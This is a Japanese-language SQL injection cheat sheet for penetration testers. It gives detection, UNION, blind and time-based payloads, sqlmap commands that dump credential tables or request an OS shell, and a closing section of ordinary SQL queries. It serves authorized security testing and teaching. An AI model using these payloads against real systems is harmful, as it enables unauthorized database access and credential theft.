---
title: "SQLインジェクションとデータベースクエリ：ペンテスター向けリファレンス"
description: "SQLインジェクションペイロード、UNION攻撃、ブラインドSQLi技術、MySQLとPostgreSQL向け標準データベースクエリ。ペネトレーションテスターとデータベース管理者のための戦術的リファレンス。"
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["SQLインジェクションペイロード", "MySQLコマンドチートシート", "PostgreSQLチートシート", "データベースハッキング", "sqlmapコマンド", "UNION SQLインジェクション", "ブラインドSQLインジェクション", "SQLインジェクションテスト", "データベース列挙", "SQLインジェクション対策"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQLインジェクションとデータベースクエリ：ペンテスター向けリファレンス",
    "description": "SQLインジェクションペイロード、UNION攻撃、ブラインドSQLi、MySQLとPostgreSQL向けデータベースクエリ。",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "ja"
  }
---

## システム初期化

SQLインジェクションはWebアプリケーションにおける最も重大な脆弱性の一つであり続けています — OWASP Top 10に常にランクインしています。これはユーザー入力が適切なサニタイズなしにSQLクエリに直接連結される場合に発生し、攻撃者がデータベースクエリのロジックを操作することを可能にします。SQLインジェクションが成功すると、データの完全な窃取、認証のバイパス、権限昇格、場合によってはデータベースサーバー上でのリモートコマンド実行につながる可能性があります。このフィールドマニュアルでは、認可されたペネトレーションテスト用の攻撃ペイロードと、すべてのデータベース管理者が知っておくべき標準SQLクエリの両方を提供します。

すべてのインジェクション技術は認可されたテスト専用です。不正アクセスは違法です。

---

## SQLi検出

SQLインジェクションの脆弱性を悪用する前に、その存在を確認する必要があります。検出では、特別に細工された入力をアプリケーションのパラメータに送信し、エラーメッセージ、動作の変化、またはタイミングの違いについて応答を観察します。これらの初期プローブにより、パラメータがインジェクション可能かどうか、どのタイプのインジェクションが可能かがわかります。

### 基本的な検出ペイロード

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### データベースバックエンドの特定

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION攻撃

UNIONベースのSQLインジェクションは、エラーメッセージやクエリ結果がページに表示される場合に最も強力な技術です。元のクエリに `UNION SELECT` 文を追加することで機能し、データベース内の任意のテーブルからデータを抽出できます。重要な要件は、UNION文が一致するように元のクエリの正確なカラム数を特定することです。

### カラム数の特定

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### データの抽出

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## ブラインドSQLインジェクション

アプリケーションがクエリ結果やエラーメッセージをページに表示しない場合、ブラインドSQLインジェクションに対処しています。脆弱性は依然として存在しますが、データ抽出には推論が必要です — ブール条件（ページが変化するか？）またはタイムディレイ（応答に時間がかかるか？）を通じて行います。ブラインドSQLiはより遅いですが、同様に危険です。

### ブールベースのブラインドインジェクション

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### タイムベースのブラインドインジェクション

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## SQLMapによる自動化

SQLMapはSQLインジェクションの自動検出と悪用のための業界標準ツールです。検出、フィンガープリンティング、データ抽出、さらにはSQLインジェクションを通じたOS レベルのアクセスまで — すべてコマンドラインから処理します。認可されたペネトレーションテストにおいて、悪用フェーズを大幅に加速します。

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## 標準SQLクエリ

インジェクションテスト以外にも、すべてのセキュリティ専門家と開発者は、データベース管理、ログ分析、調査中のデータ抽出のために標準SQLを知っておく必要があります。これらのクエリはMySQLとPostgreSQLの両方で動作し、最も一般的なデータベース操作をカバーしています。

### SELECTクエリ

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOINクエリ

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT、UPDATE、DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### データベース管理

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
